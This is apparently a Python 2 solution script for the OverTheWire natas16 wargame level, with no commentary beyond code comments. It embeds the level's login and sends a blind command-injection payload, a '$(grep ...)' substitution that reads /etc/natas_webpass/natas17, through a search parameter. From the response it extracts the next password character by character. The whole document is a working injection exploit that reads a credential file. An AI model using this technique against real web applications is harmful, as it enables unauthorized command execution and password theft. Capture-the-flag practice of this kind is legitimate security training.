import httplib2
import urllib

website = httplib2.Http()
website.add_credentials('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')

password = "" #Blank for know. Will be added to as the code guess chars
charSet = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

counter = 0 #will iterate if there is a correct guess

while (counter < len(charSet)) and (len(password) != 32):
	query = urllib.quote_plus("$(grep -E ^" + password + charSet[counter] + ".* /etc/natas_webpass/natas17)hello")
	resp, content = website.request("http://natas16.natas.labs.overthewire.org/index.php?needle=" + query + "&submit=Search", method="POST")
	#Check to see if the query was successful
	if (content.count("hello")==0):
		password += charSet[counter] #keep adding to password as characters are successful in the query
		print "Password attempt was: " + password
		counter = 0 #rest back to beginning of character of set, since we just got a successful hit
		continue #continue with the while loop
	else:
		counter += 1 #move up the characterset if not a match
		continue
